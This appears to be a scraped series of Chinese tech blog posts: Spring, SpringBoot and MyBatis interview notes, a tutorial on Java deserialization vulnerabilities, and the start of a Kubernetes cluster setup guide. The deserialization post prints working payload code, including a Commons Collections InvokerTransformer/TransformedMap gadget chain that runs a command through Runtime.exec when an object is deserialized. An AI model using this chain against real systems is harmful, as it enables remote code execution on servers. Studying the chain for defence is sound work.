AOP：将程序中的交叉业务设得(比如安全，日志，事务等），封装成一个切面，然后注入到目标对象（具体业务逻得）中去。AOP可以对某个对象或某些对象的功能进行增强，比如对象中的方法进行增强，可以在执行某个方法之前额外的做一些事情，在某个方法执行之后额外的做一些事情 AOP有哪些实现方式AOP是通过动态代理实现的，代理模式是一种设计模式，它提供了对目标对象额外的访问方式，即通过代理对象来访问目标对象，这样可以在不修改原目标对象的情况下提供额外的功能。静态代理与动态代理区别： 静态代理在编译时就实现了，编译完后是一个实际的.class文件。 动态代理是运行时生成的，即编译完以后没有实际的.class文件，而是生成类字节码，并加载到jvm中。 静态代理 指使用 AOP 框架提供的命令进行编译，从而在编译阶段就可生成 AOP 代理类，因此也称为编译时增强; 动态代理 在运行时在内存中“临时”生成 AOP 动态代理类，因此也被称为运行时增强。 JDK 动态代理：通过反射来接收被代理的类，并且要求被代理的类必须实现一个接口。JDK动态代理的核心是 InvocationHandler 接口和 Proxy 类。 CGLIB 动态代理：如果月标类没有实现接口，那么spring AoP 会选择使用 CGLIB 来动态代理目标类。CGLIB(Code Generation Library），是一个代码生成的类库，可以在运行时动态的生成某个类的子类，注意， CGLIB 是通过继承的方式做的动态代理，因此如果某个类被标记为 final，那么它是无法使用CGLTB 做动态代理的。 谈谈对IOC的理解容器概念、控制反转、依赖注入 IOC容器： 实际上就是个map (key， value），里面存的是各种对象（在xml里配置的bean节点、@repository、@service.@controller. @component)，在项目启动的时候会读取配置文件里面的bean节点，根据全限定类名使用反射创建对象放到map里、扫描到打上上述注解的类还是通过反射创建对象放到map里 这个时候map里就有各种对象了，接下来我们在代码里需要用到里面的对象时，再通过DI注入 (autowired、resource等注解，xml里bean节点内的ref属性，项目启动的时候会读取xml节点ref厲性根据id注入，也会扫描这些注解，根据类型或id注入；id就是对象名）。 控制反转： 没有引入IOC容器之前，对象A依赖于对象B，那么对象A在初始化或者运行到某一点的时候，自己必须主动去创建对象B或者使用已经创建的对象B。无论是创建还是使用对象B，控制权都在自己手上 引入IOC容器之后，对象A与对象B之间失去了直接联系，当对象A运行到需要对象B的时候，IOC容器会主动创建一个对象B注入到对象A需要的地方。通过前后的对比，不难看出来：对象A获得依赖对象B的过程,由主动行为变为了被动行为，控制权颠倒过来了，这就是控制反转这个名称的由来。 全部对象的控制权全部上缴给”第三方”IOC容器，所以，IOC容器成了整个系统的关键核心，它起到了一种类似”粘合剂”的作用，把系统中的所有对象粘合在一起发挥作用，如果没有这个”粘合剂”，对象与对象之间会彼此失去联系，这就是有人把IOC容器比喻成”粘合剂”的由来。 依赖注入： 获得依赖对象的过程被反转了。控制被反转之后，获得依赖对象的过程由自身管理变为了由IOC容器主动注入。依赖注入是实现IOC的方法，就是由容器在运行期间，动态地将某种依赖注入到对象之中。 Spring加载Bean的过程bean的定义信息：xml 注解 BeanFactory FactoryBean区别BeanFactory：必须遵循完整的Bean生命周期去创建对象，流水线式创建。FactoryBean：创建对象但是没有标准的流程，类似私人定制。 isSingleton 判断是否单例 getObjectType 返回对象的类型 getObject 返回对象 Spring Bean的生命周期创建前准备、创建实例、依赖注入、容器缓存、销毁实例 Spring 容器 从 XML 文件中读取 bean 的定义BeanDefinition，并实例化 bean。 Spring 根据 bean 的定义填充所有的属性（对对象中加入Autowried注解的属性进行自定义属性填充）。 调用Aware方法，如果 bean 实现了 BeanNameAware 接口，Spring 传递 bean 的 ID 到 setBeanName 方法；如果 Bean 实现了 BeanFactoryAware 接口， Spring 传递 beanfactory 给 setBeanFactory 方法。（设置容器属性） 如果有任何与 bean 相关联的 BeanPostProcessors，Spring 会在 postProcesserBeforeInitialization()方法内调用它们。（初始化前的方法） 如果 bean 实现 IntializingBean 了，调用它的 afterPropertiesSet 方法， 如果 bean 声明了初始化方法，调用此初始化方法。 （初始化方法） 如果有 BeanPostProcessors 和 bean 关联，这些 bean 的 postProcessAfterInitialization() 方法将被调用。 （初始化后方法，这里会进行AOP） 如果当前创建的bean是单例的，把bean放入单例池 使用bean 如果 bean 实现了 DisposableBean，它将调用 destroy()方法。 什么是Bean的自动装配，有哪些方式 Spring 容器能够自动装配相互合作的 bean，这意味着容器不需要和配置，能通 过 Bean 工厂自动处理 bean 之间的协作。 1&lt;bean id = &quot;book&quot; class = &quot;com.xxx.xxx.Book&quot; autowrire = &quot;&quot;&gt; no：默认的方式是不进行自动装配，通过显式设置 ref 属性来进行装配。 byName：通过参数名 自动装配，Spring 容器在配置文件中发现 bean 的 autowire 属性被设置成 byname，之后容器试图匹配、装配和该 bean 的属性具有相同名字的 bean。 byType：通过参数类型自动装配，Spring 容器在配置文件中发现 bean 的 autowire 属性被设置成 byType，之后容器试图匹配、装配和该 bean 的属性具有相同类型的 bean。如果有多个 bean 符合条件，则抛出错误，使用@Qualifire注解指定 一个去注入。 constructor：这个方式类似于 byType， 但是要提供给构造器参数，如果没有确定的带参数的构造器参数类型，将会抛出异常。 autodetect：首先尝试使用 constructor 来自动装配，如果无法工作， 则使用 byType 方式。 Spring中的Bean是线程安全的吗Spring本身并没有针对Bean做线程安全的处理，所以 如果Bean是无状态的，则Bean是线程安全的 有状态，则不安全 另外，Bean是不是线程安全跟Bean作用域没关系，Bean作用域只是表示Bean生命周期的范围 Spring支持的几种bean的作用域 singleton : bean在每个Spring ioc 容器中只有一个实例。单例模式由BeanFactory自身来维护。该对象的生命周期和IOC一致。（在第一次被注入时才会被创建） prototype：为每一个bean请求提供一个实例。在每次注入时都会创建一个新的对象。 request：每次http请求都会创建一个bean，该作用域仅在基于web的Spring ApplicationContext情形下有效。 session：在一个HTTP Session中，一个bean定义对应一个实例。session过期以后bean会随之失效 global-session：在一个全局的HTTP Session中，一个bean定义对应一个实例。该作用域仅在基于web的Spring ApplicationContext情形下有效。 注意： 缺省的Spring bean 的作用域是Singleton。使用 prototype 作用域需要慎重的思考，因为频繁创建和销毁 bean 会带来很大的性能开销。 Spring如何解决循环依赖关键词：三级缓存、提前暴露对象、AOP 总：什么是循环依赖？ A有b属性，B有a属性 bean的创建过程是先实例化–&gt;初始化 A在实例化后初始化时b属性为空，去容器中找B对象 有B，不存在循环依赖 无B，创建B，填充a属性 —&gt;容器中去找A 找不到 仔细思考发现A对象是存在的，不过不是一个完整状态，只完成了实例化，没有完成初始化。如果调用了某个对象的引用，后期可以先把非完整状态赋值，等后续操作来完成赋值，相当于提前暴露了某个不完整对象的引用。所以解决问题的核心在于实例化和初始化分开操作 当所有对象都完成操作实例化之后，还要把对象放入容器中，此时容器中的对象有两个状态 实例化完成但未初始化完成 实例化初始化都完成 这两种对象都在容器中，所以要用不同的map结构来进行存储，此时就有一级缓存和二级缓存 一级缓存放完整的对象 二级缓存放非完整对象 三级缓存中的value类型是ObjectFactory函数式接口，存在的意义是保证在容器中同名的bean对象只有一个，一个对象如果要被代理，或者说要生成代理对象，那么先需要一个普通对象。普通对象和代理对象不能同时出现在容器中，因此一个对象需要被代理时就需要使用代理对象去覆盖之前的普通对象，在实际调用中是没有办法确定什么时候对象被调用，所以就需要当某个对象被调用时优先判断此对象是否需要被代理，类似一种回调机制的实现，因此传入lambda表达式时可以通过lambda表达式来执行对象覆盖过程 因此所有bean对象在创建时都放在三级缓存中，后续使用中需要被代理则返回代理对象，不需要则返回普通对象 Spring事务的实现及隔离级别有两种使用事务的方式：编程式和申明式 编程式就是调用一些API 申明式例如@Transaction（rollback = “”） Spring事务隔离级别就是数据库的隔离级别。如果数据库配置RC，Spirng配置RR，则以Spring配置为准，如果Spring设置的隔离级别数据库不支持，那么以数据库为准。 Spring Boot、MVC、Spring区别 spring是一个lOC容器，用来管理Bean，使用依赖注入实现控制反转，可以很方便的整合各种框架，提供AOP机制弥补OOP的代码重复问题、更方便将不同类不同方法中的共同处理抽取成切面、自动注入给方法执行，比如日志、异常等 springmvc是spring对web框架的一个解决方案，提供了一个总的前端控制器Servlet，用来接收请求，然后定义了一套路由策略(url到handle的映射)及适配执行handle，将handle结果使用视图解析技术生成视图展现给前端 springboot是spring提供的一个快速开发工具包，让程序员能更方便、更快速的开发spring+springmvc应用，简化了配置(约定了默认配置)，整合了一系列的解决方案(starter机制) 、 redis、mongodb、es，可以开箱即用 Spring MVC工作流程 流程说明（重要）: 客户端（浏览器）发送请求，直接请求到Dispatcherservlet。 Dispatcherservlet根据请求信息调用HandlerMapping，拿到控制链。&lt;url，handler&gt;的一个Map Dispatcherservlet调用HandlerAdapter适配器处理 解析到对应的Handler(也就是我们平常说的Controller控制器） Controller执行完成返回ModelAndView HandlerAdapter会根据把ModelAndView返回给Dispatcherservlet ViewResolver会根据逻辑view查找实际的view。 Dispaterservlet把返回的Model传给view（视图渲染） 把view返回给请求者（浏览器) Spring MVC主要组件 SpringBoot自动配置原理@SpringBootApplication可以看作是 @SpringBootConfiguration、@EnableAutoConfiguration、@ComponentScan 注解的集合。根据 SpringBoot 官网，这三个注解的作用分别是： @EnableAutoConfiguration：启用 SpringBoot 的自动配置机制 @SpringBootConfiguration：允许在上下文中注册额外的 bean 或导入其他配置类 @ComponentScan： 扫描被@Component (@Service,@Controller)注解的 bean，注解默认会扫描启动类所在的包下所有的类 ，可以自定义不扫描某些 bean。如下图所示，容器中将排除TypeExcludeFilter和AutoConfigurationExcludeFilter。 @EnableAutoConfigurationSpring中有很多Enable开头的注解其作用就是借助@Import来收集并注册特定场景相关的Bean，并加载到IOC容器。@EnableAutoConfiguration就是借助@lmport来收集所有符合自动配置条件的bean定义，并加载到IOC容器。 @Import（AutoConfigurationImportSelector.class） 帮助SpringBoot将所有符合条件的@Configuration配置都加载到当前SpringBoot创建并使用的IOC容器中。 AutoConfigurationImportSelector类实现了Aware相关接口 其中getImports()中调用selectImports() @AutoConfigurationPackage @Import：导入Registar组件 就干一件事：拿到启动类所在的包名。 SpringBoot常用注解及底层实现原理1.@SpringBootApplication注解:这个注解标识了一个SpringBoot工程，它实际上是另外三个注解的组合，这三个注解是: @SpringBootConfiguration:这个注解实际就是一个@Configuration，表示启动类也是一个配置类 .@EnableAutoConfiguration:向Spring容器中导入了一个Selector，用来加载Classpath 下SpringFactories中所定义的自动配置类，将这些自动加载为配置Bean @ComponentScan:标识扫描路径，因为默认是没有配置实际扫描路径，所以SpringBoot扫描的路径是启动类所在的当前目录 2.@Bean注解:用来定义Bean，类似于XML中的标签，Spring在启动时，会对加了@Bean注解的方法进行解析，将方法的名字做为beanName，并通过执行方法得到bean对象3.@Controller、@Service、@ResponseBody、@Autowired都可以 如何理解SpringBoot中的starter 使用spring + springmvc使用，如果需要引入mybatis等框架，需要到xml中定义mybatis需要的bean starter就是定义一个starter的jar包，写一个@Configuration配置类、将这些bean定义在里面，然后在starter包的META-INF/spring.factories中写入该配置类,springboot会按照约定来加载该配置类 开发人员只需要将相应的starter包依赖进应用，进行相应的属性配置（使用默认配置时，不需要配置)，就可以直接进行代码开发，使用对应的功能了，比如mybatis-spring-boot-starter，spring-boot-starter-redis Springboot的启动流程细节 SpringBoot启动的时候，会构造一个SpringApplication的实例，然后调用这个实例的run方法，在run方法调用之前，也就是构造SpringApplication的时候会进行初始化的工作，初始化的时候会做以下几件事：(1)把参数sources设置到SpringApplication属性中，这个sources可以是任何类型的参数.(2)判断是否是web程序，并设置到webEnvironment的boolean属性中.(3)创建并初始化ApplicationInitializer，设置到initializers属性中 。(4)创建并初始化ApplicationListener，设置到listeners属性中 。(5)初始化主类mainApplicatioClass。 SpringApplication构造完成之后调用run方法，启动SpringApplication，run方法执行的时候会做以下几件事：(1)构造一个StopWatch计时器，观察SpringApplication的执行 。(2)获取SpringApplicationRunListeners并封装到SpringApplicationRunListeners中启动，用于监听run方法的执行。(3)创建并初始化ApplicationArguments,获取run方法传递的args参数。(4)创建并初始化ConfigurableEnvironment（环境配置）。(5)打印banner（只用在Classpath下添加字符文件图标，就可以在启动时候打印）。(3)构造Spring容器(ApplicationContext)上下文。(4)SpringApplicationRunListeners发布finish事件。(5)StopWatch计时器停止计时。 MyBatis优缺点优点: 基于SQL语句编程，相当灵活，不会对应用程序或者数据库的现有设计造成任何影响，SQL写在XML里，解除sql与程序代码的耦合，便于统一管理;提供XML标签，支持编写动态SQL语句，并可重用。 与JDBC相比，减少了50%以上的代码量，消除了JDBC大量冗余的代码，不需要手动开关连接; 很好的与各种数据库兼容（因为MyBatis 使用JDBC来连接数据库，所以只要JDBC支持的数据库MyBatis都支持)。 能够与Spring很好的集成; 供映射标签，支持对象与数据库的ORM字段关系映射;提供对象关系映射标签，支持对象关系组件维护。 缺点: SQL语句的编写工作量较大，尤其当字段多、关联表多时，对开发人员编写SQL语句的功底有一定要求。 SQL语句依赖于数据库，导致数据库移植性差，不能随意更换数据库。 #{} 和 ${}区别 #{}是预编译处理是占位符，${}是字符串替换、是拼接符。 Mybatis在处理#{}时，会将sql中的#{}替换为?号，调用PreparedStatement来赋值，会有预编译，#对应的变量自动加上单引号； Mybatis在处理${}时，就是把${}替换成变量的值，是动态参数（比如通过传参动态设置表名，动态设置排序字段），调用Statement来赋值，相当于直接拼接，${}对应的变量不会加上单引号； 使用#{}可以有效的防止SQL注入，提高系统安全性。 MyBatis二级缓存 Mybatis 中有一级缓存和二级缓存，默认情况下一级缓存是开启的，而且是不能关闭的。一级缓存 是指 SqlSession 级别的缓存，当在同一个 SqlSession 中进行相同的 SQL 语句查询时，第二次以 后的查询不会从数据库查询，而是直接从缓存中获取，一级缓存最多缓存 1024 条 SQL。二级缓存 是指可以跨 SqlSession 的缓存。是 mapper 级别的缓存，对于 mapper 级别的缓存不同的 sqlsession 是可以共享的","link":"/2022/05/22/Spring/"},{"title":"Java反序列化漏洞","text":"payload 什么是序列化和反序列化 序列化:是将对象的状态信息转换为可以存储或传输形式的过程。 反序列化:将对象数据从按照某一种标准，解析成对象，读取到内存。 那为什么要将对象序列化，或者说他的应用场景有哪些? 我们都知道，程序运行，对象数据是保存到内存中的，那如果对象很多，会占据很多内存空间，但我们的内存是有限的，而且很贵，所以,需要长时间保存的对象，我们可以将这些对象保存到硬盘中，一方面，硬盘比内存便宜另一方面为了数据安全，内存断电数据就丢失了，但对象是一个抽象的数据结构，怎么保存到硬盘中，我们可以将对象，按照Io格式转换成一个字符串或者某个二进制的文件，这个就叫做序列化。 还有一种情况，我们都知道服务器和服务器之间通讯，肯定要传输数据，数据传输肯定要约定某一个格式，所以说如果要传输对象，我们也需要将对象转换成每一种特定的格式，这也是序列化的一种应用场景。 一个类的对象要想序列化成功，必须满足两个条件 该类必须实现java.io.Serializable接口。 该类的所有属性必须是可序列化的。如果有一个属性不是可序列化的，则该属性必须注明是短暂的。 该类有实现java.io.Serializable接口，在反序列化的时候会执行readObject()方法，举例如下： 1234567891011121314151617181920212223@Data@AllArgsConstructor@NoArgsConstructorpublic class SerialTest implements Serializable { private String name; private Integer age; private void readObject(java.io.ObjectInputStream in) throws Exception { //默认执行的readObject()代码 in.defaultReadObject(); //调用服务器命令脚本 Runtime.getRuntime().exec(&quot;calc.exe&quot;); Process process = Runtime.getRuntime().exec(&quot;ipconfig&quot;); InputStream fis = process.getInputStream(); InputStreamReader isr = new InputStreamReader(fis); BufferedReader br = new BufferedReader(isr); String line = &quot;&quot;; while ((line = br.readLine()) != null){ System.out.println(line); } }} 序列化与反序列化 123456789101112131415161718192021222324252627282930313233343536public class test01 { public static void main(String[] args) { SerialTest winky = new SerialTest(&quot;Winky&quot;, 24); try { serializable(winky); unSerializable(); } catch (Exception e) { e.printStackTrace(); } } public static void serializable(SerialTest s) throws IOException { //文件输出流 FileOutputStream file = new FileOutputStream(&quot;D:\\\\a.txt&quot;); //创建对象输出流 ObjectOutputStream objOut = new ObjectOutputStream(file); //将对象序列化 objOut.writeObject(s); System.out.println(&quot;序列化成功&quot;); file.close(); objOut.close(); } public static void unSerializable() throws Exception { FileInputStream inFile = new FileInputStream(&quot;D:\\\\a.txt&quot;); ObjectInputStream objIn = new ObjectInputStream(inFile); SerialTest serialTest = (SerialTest) objIn.readObject(); String name = serialTest.getName(); System.out.println(name); System.out.println(&quot;反序列化成功&quot;); inFile.close(); objIn.close(); }} 构建类的要求： 实现Serializable接口 重写readObject()方法 恶意命令可控（比如可以执行任意类的任意方法：反射实现） 类必须存在与应用程序（比如自带类库、第三方jar包） 1**Apache Commons Collections** Apache Commons Collections是一个扩展了Java标准库里的Collection结构的第三方基础库。 org.apache.commons.collections提供一个类包来扩展和增加标准的Java的collection框架，也就是说这些扩展也属于collection的基本概念，只是功能不同罢了。Java中的collection可以理解为一组对象，collection里面的对象称为collection的对象。具象的collection为set，list，queue等等，它们是集合类型。换一种理解方式,collection是set，list,queue的抽象。 但是，如果readObject这个方法里面或者调用的方法里面，存在能够执行任意类的任意方法的逻辑，我们是不是就闭环了。 在java里面什么东西可以执行执行任意类的任意方法? 在InvokerTransformer实现类中重写了transform方法，传入的参数类型为Object，且通过反射可以执行里面的任意的方法 123456789101112131415161718public Object transform(Object input) { if (input == null) { return null;} else { try { Class cls = input.getClass(); //通过反射传入方法名称和类型 Method method = cls.getMethod(this.iMethodName, this.iParamTypes); return method.invoke(input, this.iArgs); } catch (NoSuchMethodException var4) { throw new FunctorException(&quot;InvokerTransformer: The method '&quot; + this.iMethodName + &quot;' on '&quot; + input.getClass() + &quot;' does not exist&quot;); } catch (IllegalAccessException var5) { throw new FunctorException(&quot;InvokerTransformer: The method '&quot; + this.iMethodName + &quot;' on '&quot; + input.getClass() + &quot;' cannot be accessed&quot;); } catch (InvocationTargetException var6) { throw new FunctorException(&quot;InvokerTransformer: The method '&quot; + this.iMethodName + &quot;' on '&quot; + input.getClass() + &quot;' threw an exception&quot;, var6); }}} 12345678public class test2 { public static void main(String[] args) { Runtime runtime = Runtime.getRuntime(); InvokerTransformer exec = new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;calc&quot;}); exec.transform(runtime); }} 但是上述代码并没有满足重写readObject()方法 TransformedMap类实现了Serializable方法，并且重写了readObject()方法。 由于TransformedMap构造器是protected修饰的 12345678910//protected修饰的protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) { super(map); this.keyTransformer = keyTransformer; this.valueTransformer = valueTransformer;}//调用此方法可以new一个对象public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) { return new TransformedMap(map, keyTransformer, valueTransformer);} payload12345678910111213141516171819202122232425262728293031323334353637383940414243public static void main(String[] args){ try { //分别获取 getRuntime() , invoke() , exec() 方法 , 然后将这些实例对象添加到 this.iTransformers 数组中 , 从而获得一条完整的调用链 Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;,new Class[]{String.class,Class[].class},new Object[]{&quot;getRuntime&quot;,new Class[0]}), new InvokerTransformer(&quot;invoke&quot;,new Class[]{Object.class,Object[].class},new Object[]{null,new Object[0]}), new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new Object[]{&quot;calc&quot;}), }; Transformer invokerTransformer = new ChainedTransformer(transformers); HashMap&lt;Object, Object&gt; m1 = new HashMap&lt;&gt;(); m1.put(&quot;value&quot;,&quot;a&quot;); Map&lt;Object,Object&gt; m2 = TransformedMap.decorate(m1, null, invokerTransformer); Class&lt;?&gt; aClass = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor cto = aClass.getDeclaredConstructor(Class.class, Map.class); cto.setAccessible(true); Object o = cto.newInstance(Retention.class, m2); serializable(o); unSerializable(); } catch (Exception e) { e.printStackTrace(); } } public static void serializable(Object o) throws Exception { FileOutputStream file = new FileOutputStream(&quot;D:\\\\a.txt&quot;); ObjectOutputStream objOut = new ObjectOutputStream(file); objOut.writeObject(o); System.out.println(&quot;序列化成功&quot;); file.close(); objOut.close(); } public static void unSerializable() throws Exception { FileInputStream inFile = new FileInputStream(&quot;D:\\\\a.txt&quot;); ObjectInputStream objIn = new ObjectInputStream(inFile); objIn.readObject(); System.out.println(&quot;反序列化成功&quot;); inFile.close(); objIn.close(); }","link":"/2022/07/01/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"title":"Kubernetes(k8s)","text":"k8s基础篇 Kubernetes介绍应用部署方式演变在部署应用程序的方式上，主要经历了三个时代： 传统部署：互联网早期，会直接将应用程序部署在物理机上 优点：简单，不需要其它技术的参与 缺点：不能为应用程序定义资源使用边界，很难合理地分配计算资源，而且程序之间容易产生影响 虚拟化部署：可以在一台物理机上运行多个虚拟机，每个虚拟机都是独立的一个环境 优点：程序环境不会相互产生影响，提供了一定程度的安全性 缺点：增加了操作系统，浪费了部分资源 容器化部署：与虚拟化类似，但是共享了操作系统 优点： 可以保证每个容器拥有自己的文件系统、CPU、内存、进程空间等 运行应用程序所需要的资源都被容器包装，并和底层基础架构解耦 容器化的应用程序可以跨云服务商、跨Linux操作系统发行版进行部署 容器化部署方式给带来很多的便利，但是也会出现一些问题，比如说： 一个容器故障停机了，怎么样让另外一个容器立刻启动去替补停机的容器 当并发访问量变大的时候，怎么样做到横向扩展容器数量 这些容器管理的问题统称为容器编排问题，为了解决这些容器编排问题，就产生了一些容器编排的软件： Swarm：Docker自己的容器编排工具 Mesos：Apache的一个资源统一管控的工具，需要和Marathon结合使用 Kubernetes：Google开源的的容器编排工具 kubernetes简介kubernetes，是一个全新的基于容器技术的分布式架构领先方案，是谷歌严格保密十几年的秘密武器—-Borg系统的一个开源版本，于2014年9月发布第一个版本，2015年7月发布第一个正式版本。 kubernetes的本质是一组服务器集群，它可以在集群的每个节点上运行特定的程序，来对节点中的容器进行管理。目的是实现资源管理的自动化，主要提供了如下的主要功能： 自我修复：一旦某一个容器崩溃，能够在1秒中左右迅速启动新的容器 弹性伸缩：可以根据需要，自动对集群中正在运行的容器数量进行调整 服务发现：服务可以通过自动发现的形式找到它所依赖的服务 负载均衡：如果一个服务起动了多个容器，能够自动实现请求的负载均衡 版本回退：如果发现新发布的程序版本有问题，可以立即回退到原来的版本 存储编排：可以根据容器自身的需求自动创建存储卷 kubernetes组件一个kubernetes集群主要是由**控制节点(master)、工作节点(node)**构成，每个节点上都会安装不同的组件。 master：集群的控制平面，负责集群的决策 ( 管理 ) ApiServer : 资源操作的唯一入口，接收用户输入的命令，提供认证、授权、API注册和发现等机制 Scheduler : 负责集群资源调度，按照预定的调度策略将Pod调度到相应的node节点上 ControllerManager : 负责维护集群的状态，比如程序部署安排、故障检测、自动扩展、滚动更新等 Etcd ：负责存储集群中各种资源对象的信息 node：集群的数据平面，负责为容器提供运行环境 ( 干活 ) Kubelet : 负责维护容器的生命周期，即通过控制docker，来创建、更新、销毁容器 KubeProxy : 负责提供集群内部的服务发现和负载均衡 Docker : 负责节点上容器的各种操作 下面，以部署一个nginx服务来说明kubernetes系统各个组件调用关系： 首先要明确，一旦kubernetes环境启动之后，master和node都会将自身的信息存储到etcd数据库中 一个nginx服务的安装请求会首先被发送到master节点的apiServer组件 apiServer组件会调用scheduler组件来决定到底应该把这个服务安装到哪个node节点上 在此时，它会从etcd中读取各个node节点的信息，然后按照一定的算法进行选择，并将结果告知apiServer apiServer调用controller-manager去调度Node节点安装nginx服务 kubelet接收到指令后，会通知docker，然后由docker来启动一个nginx的pod pod是kubernetes的最小操作单元，容器必须跑在pod中至此， 一个nginx服务就运行了，如果需要访问nginx，就需要通过kube-proxy来对pod产生访问的代理 这样，外界用户就可以访问集群中的nginx服务了 kubernetes概念Master：集群控制节点，每个集群需要至少一个master节点负责集群的管控 Node：工作负载节点，由master分配容器到这些node工作节点上，然后node节点上的docker负责容器的运行 Pod：kubernetes的最小控制单元，容器都是运行在pod中的，一个pod中可以有1个或者多个容器 Controller：控制器，通过它来实现对pod的管理，比如启动pod、停止pod、伸缩pod的数量等等 Service：pod对外服务的统一入口，下面可以维护者同一类的多个pod（Service是对pod服务发现和负载均衡的作用） Label：标签，用于对pod进行分类，同一类pod会拥有相同的标签 NameSpace：命名空间，用来隔离pod的运行环境 kubernetes集群环境搭建前置知识点目前生产部署Kubernetes 集群主要有两种方式： kubeadm Kubeadm 是一个K8s 部署工具，提供kubeadm init 和kubeadm join，用于快速部署Kubernetes 集群。 官方地址：https://kubernetes.io/docs/reference/setup-tools/kubeadm/kubeadm/ 二进制包 从github 下载发行版的二进制包，手动部署每个组件，组成Kubernetes 集群。 Kubeadm 降低部署门槛，但屏蔽了很多细节，遇到问题很难排查。如果想更容易可控，推荐使用二进制包部署Kubernetes 集群，虽然手动部署麻烦点，期间可以学习很多工作原理，也利于后期维护。 集群类型：一主多从和多主多从 一主多从：一台Master节点和多台Node节点，搭建简单，但是又单机故障风险，适用于测试环境 多诸多从：多台Master节点和多台Node节点，搭建麻烦，安全性高，适用于生产环境 kubeadm 部署方式介绍kubeadm 是官方社区推出的一个用于快速部署kubernetes 集群的工具，这个工具能通过两条指令完成一个kubernetes 集群的部署： 创建一个Master 节点kubeadm init 将Node 节点加入到当前集群中$ kubeadm join &lt;Master 节点的IP 和端口&gt; 安装要求在开始之前，部署Kubernetes 集群机器需要满足以下几个条件： 一台或多台机器，操作系统CentOS7.x-86_x64 硬件配置：2GB 或更多RAM，2 个CPU 或更多CPU，硬盘30GB 或更多 集群中所有机器之间网络互通 可以访问外网，需要拉取镜像 禁止swap 分区 最终目标 在所有节点上安装Docker 和kubeadm 部署Kubernetes Master 部署容器网络插件 部署Kubernetes Node，将节点加入Kubernetes 集群中 部署Dashboard Web 页面，可视化查看Kubernetes 资源 准备环境 角色 IP地址 组件 k8s-master01 192.168.5.3 docker，kubectl，kubeadm，kubelet k8s-node01 192.168.5.4 docker，kubectl，kubeadm，kubelet k8s-node02 192.168.5.5 docker，kubectl，kubeadm，kubelet 系统初始化设置系统主机名以及 Host 文件的相互解析123hostnamectl set-hostname k8s-master01 &amp;&amp; bashhostnamectl set-hostname k8s-node01 &amp;&amp; bashhostnamectl set-hostname k8s-node02 &amp;&amp; bash 12345cat &lt;&lt;EOF&gt;&gt; /etc/hosts192.168.5.3 k8s-master01192.168.5.4 k8s-node01192.168.5.5 k8s-node02EOF 12scp /etc/hosts root@192.168.5.4:/etc/hosts scp /etc/hosts root@192.168.5.5:/etc/hosts 安装依赖文件（所有节点都要操作）1yum install -y conntrack ntpdate ntp ipvsadm ipset jq iptables curl sysstat libseccomp wget vim net-tools git 设置防火墙为 Iptables 并设置空规则（所有节点都要操作）123systemctl stop firewalld &amp;&amp; systemctl disable firewalldyum -y install iptables-services &amp;&amp; systemctl start iptables &amp;&amp; systemctl enable iptables &amp;&amp; iptables -F &amp;&amp; service iptables save 关闭 SELINUX（所有节点都要操作）123swapoff -a &amp;&amp; sed -i '/ swap / s/^\\(.*\\)$/#\\1/g' /etc/fstabsetenforce 0 &amp;&amp; sed -i 's/^SELINUX=.*/SELINUX=disabled/' /etc/selinux/config 调整内核参数，对于 K8S（所有节点都要操作）123456789101112131415161718192021modprobe br_netfiltercat &lt;&lt;EOF&gt; kubernetes.conf net.bridge.bridge-nf-call-iptables=1net.bridge.bridge-nf-call-ip6tables=1net.ipv4.ip_forward=1net.ipv4.tcp_tw_recycle=0vm.swappiness=0 # 禁止使用 swap 空间，只有当系统 OOM 时才允许使用它vm.overcommit_memory=1 # 不检查物理内存是否够用vm.panic_on_oom=0 # 开启 OOMfs.inotify.max_user_instances=8192fs.inotify.max_user_watches=1048576fs.file-max=52706963fs.nr_open=52706963net.ipv6.conf.all.disable_ipv6=1net.netfilter.nf_conntrack_max=2310720EOFcp kubernetes.conf /etc/sysctl.d/kubernetes.confsysctl -p /etc/sysctl.d/kubernetes.conf 调整系统时区（所有节点都要操作）1234567# 设置系统时区为 中国/上海timedatectl set-timezone Asia/Shanghai# 将当前的 UTC 时间写入硬件时钟timedatectl set-local-rtc 0# 重启依赖于系统时间的服务systemctl restart rsyslogsystemctl restart crond 设置 rsyslogd 和 systemd journald（所有节点都要操作）1234567891011121314151617181920212223242526272829# 持久化保存日志的目录mkdir /var/log/journal mkdir /etc/systemd/journald.conf.dcat &gt; /etc/systemd/journald.conf.d/99-prophet.conf &lt;&lt;EOF[Journal]# 持久化保存到磁盘Storage=persistent# 压缩历史日志Compress=yesSyncIntervalSec=5mRateLimitInterval=30sRateLimitBurst=1000# 最大占用空间 10GSystemMaxUse=10G# 单日志文件最大 200MSystemMaxFileSize=200M# 日志保存时间 2 周MaxRetentionSec=2week# 不将日志转发到 syslogForwardToSyslog=noEOFsystemctl restart systemd-journald kube-proxy开启ipvs的前置条件（所有节点都要操作）12345678910cat &lt;&lt;EOF&gt; /etc/sysconfig/modules/ipvs.modules #!/bin/bashmodprobe -- ip_vsmodprobe -- ip_vs_rrmodprobe -- ip_vs_wrrmodprobe -- ip_vs_shmodprobe -- nf_conntrack_ipv4EOFchmod 755 /etc/sysconfig/modules/ipvs.modules &amp;&amp; bash /etc/sysconfig/modules/ipvs.modules &amp;&amp; lsmod | grep -e ip_vs -e nf_conntrack_ipv4 安装 Docker 软件（所有节点都要操作）123456789101112131415161718192021yum install -y yum-utils device-mapper-persistent-data lvm2yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repoyum install -y docker-ce## 创建 /etc/docker 目录mkdir /etc/dockercat &gt; /etc/docker/daemon.json &lt;&lt;EOF{&quot;exec-opts&quot;: [&quot;native.cgroupdriver=systemd&quot;],&quot;log-driver&quot;: &quot;json-file&quot;,&quot;log-opts&quot;: {&quot;max-size&quot;: &quot;100m&quot;}}EOFmkdir -p /etc/systemd/system/docker.service.d# 重启docker服务systemctl daemon-reload &amp;&amp; systemctl restart docker &amp;&amp; systemctl enable docker 上传文件到/etc/yum.repos.d/目录下，也可以 代替 yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo 命令 docker-ce.repo 